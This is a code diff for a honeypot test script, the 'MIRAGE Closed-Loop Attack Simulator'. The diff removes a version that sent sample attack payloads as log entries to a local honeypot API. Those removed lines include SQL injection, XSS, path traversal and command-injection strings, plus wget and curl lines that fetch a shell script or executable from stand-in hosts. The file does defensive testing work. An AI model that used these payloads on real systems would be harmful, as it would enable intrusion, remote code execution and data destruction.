@@ -1,174 +1,24 @@
-import time
-import random
-import requests
-import argparse
+import os
 import sys
+import asyncio
 
-# Default URL of the honeypot API
-BASE_URL = "http://localhost:8000"
+# Ensure backend directory is in the path
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-# Attack types and their payloads
-ATTACK_TEMPLATES = {
-    "port_scan": {
-        "payloads": ["", "SCAN / HTTP/1.1", "Nmap port sweep"],
-        "ports": [22, 80, 443, 3306, 8080, 23]
-    },
-    "brute_force": {
-        "payloads": ["admin/admin", "root/password123", "support/support", "guest/guest"],
-        "ports": [22, 21, 3389]
-    },
-    "sql_injection": {
-        "payloads": ["1' OR '1'='1", "admin' --", "' UNION SELECT username, password FROM users --", "1; DROP TABLE logs;"],
-        "ports": [80, 3306, 8080]
-    },
-    "xss": {
-        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert(1)>"],
-        "ports": [80, 443]
-    },
-    "command_injection": {
-        "payloads": ["; cat /etc/passwd", "| wget http://malicious.com/shell.sh", "&& whoami", "; id"],
-        "ports": [80, 8080, 22]
-    },
-    "malware_delivery": {
-        "payloads": ["MZ\x90\x00\x03\x00\x00\x00... [malware binary]", "eval(base64_decode('...'))", "curl http://evil.com/payload.exe -o payload.exe"],
-        "ports": [80, 21, 445]
-    },
-    "path_traversal": {
-        "payloads": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/static/../../config.json"],
-        "ports": [80, 8080]
-    }
-}
-
-# Mapping of attack type to expected honeypot deception states
-EXPECTED_DECEPTION_STATES = {
-    "port_scan": "port_expansion",
-    "brute_force": "credential_trap",
-    "sql_injection": "database_decoy",
-    "xss": "web_decoy",
-    "command_injection": "shell_trap",
-    "malware_delivery": "malware_sink",
-    "path_traversal": "filesystem_decoy"
-}
-
-def generate_random_ip():
-    return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
-
-def send_attack(ip_address, attack_type, step_num):
-    template = ATTACK_TEMPLATES.get(attack_type, ATTACK_TEMPLATES["port_scan"])
-    payload = random.choice(template["payloads"])
-    port = random.choice(template["ports"])
-    protocol = "TCP" if port != 23 else "Telnet"
-    
-    url = f"{BASE_URL}/api/logs/ingest"
-    payload_data = {
-        "ip_address": ip_address,
-        "port": port,
-        "protocol": protocol,
-        "payload": payload,
-        "metadata": {
-            "agent": "Mozilla/5.0 Scanner",
-            "step": step_num
-        }
-    }
-    
-    try:
-        res = requests.post(url, json=payload_data, timeout=5.0)
-        if res.status_code == 200:
-            return res.json()
-        else:
-            print(f"[-] Ingest returned status code {res.status_code}: {res.text}")
-    except Exception as e:
-        print(f"[-] Connection to honeypot failed: {e}")
-    return None
-
-def simulate_attacker_session(ip_address, delay):
-    """
-    Simulates a closed-loop attacker interaction.
-    Attacker proceeds through attack chain steps if honeypot deception is convincing.
-    """
-    # Attacker chain path
-    steps = ["port_scan"]
-    
-    # Choose branch
-    branch = random.choice(["database", "credentials", "server"])
-    if branch == "database":
-        steps.extend(["sql_injection", "path_traversal"])
-    elif branch == "credentials":
-        steps.extend(["brute_force", "command_injection"])
-    else:
-        steps.extend(["xss", "malware_delivery"])
-        
-    print(f"\n[*] Starting session for IP: {ip_address} | Target Chain: {' -> '.join(steps)}")
-    
-    for idx, attack_type in enumerate(steps):
-        step_num = idx + 1
-        print(f"  [+] Step {step_num}: Ingesting '{attack_type}'...")
-        
-        # Ingest the log
-        response = send_attack(ip_address, attack_type, step_num)
-        
-        if not response:
-            print("  [-] No response from server. Aborting chain.")
-            break
-            
-        deception = response.get("deception", {})
-        chosen_state = deception.get("honeypot_state", "default")
-        chosen_level = deception.get("interaction_level", "low")
-        
-        print(f"    <- Honeypot Response: State='{chosen_state}', Level='{chosen_level}'")
-        
-        # Check if the honeypot succeeded in deploying matched deception
-        expected_state = EXPECTED_DECEPTION_STATES.get(attack_type, "default")
-        is_convincing = (chosen_state == expected_state) and (chosen_level in ["medium", "high"])
-        
-        if is_convincing:
-            print("    [+] convinced: Attacker is engaged. Continuing chain.")
-            # Attacker stays longer if convinced
-            time.sleep(delay)
-        else:
-            # If the honeypot chose a bad/low-interaction defense, the attacker leaves early with 75% probability
-            if random.random() < 0.75:
-                print("    [-] suspicious/bored: Attacker detected honeypot or hit dead end. Exiting session early.")
-                break
-            else:
-                print("    [?] persistent: Attacker is suspicious but persists to next step.")
-                time.sleep(delay)
+from backend.database import SessionLocal
+from backend.core.demo_engine import run_closed_loop_simulation
 
 def main():
-    parser = argparse.ArgumentParser(description="MIRAGE Closed-Loop Attack Simulator")
-    parser.add_argument("--count", type=int, default=30, help="Number of attacker sessions to simulate")
-    parser.add_argument("--delay", type=float, default=0.5, help="Delay in seconds between steps inside a session")
-    parser.add_argument("--session-delay", type=float, default=1.0, help="Delay in seconds between different sessions")
-    args = parser.parse_args()
-    
-    print(f"=== Starting MIRAGE Attack Simulator ===")
-    print(f"Targeting backend at: {BASE_URL}")
-    print(f"Simulating {args.count} attacker sessions (multi-step closed-loop chains)...")
-    
+    print("=== Starting MIRAGE Attack Simulator ===")
+    print("Running closed-loop simulation directly via unified backend core logic...")
+    db = SessionLocal()
     try:
-        # Check if backend is alive
-        requests.get(BASE_URL, timeout=3.0)
-    except Exception:
-        print(f"Error: Backend server is not running on {BASE_URL}. Start the backend first.")
-        sys.exit(1)
-        
-    for i in range(args.count):
-        session_idx = i + 1
-        print(f"\n=== Session {session_idx}/{args.count} ===")
-        ip = generate_random_ip()
-        simulate_attacker_session(ip, args.delay)
-        
-        # Delay between sessions to separate visual feed logs
-        time.sleep(args.session_delay)
-        
-        # Periodically trigger manual session reaping to see learning curve update quickly
-        # We can call `/api/admin/close-sessions` to finalize rewards of completed sessions
-        try:
-            requests.post(f"{BASE_URL}/api/admin/close-sessions", timeout=2.0)
-        except Exception:
-            pass
-
-    print("\n=== Simulation Complete ===")
+        events = asyncio.run(run_closed_loop_simulation(db, session_count=10, step_delay=0.01))
+        print(f"\n=== Simulation Complete. Total events generated: {events} ===")
+    except Exception as e:
+        print(f"[-] Simulation failed: {e}")
+    finally:
+        db.close()
 
 if __name__ == "__main__":
     main()
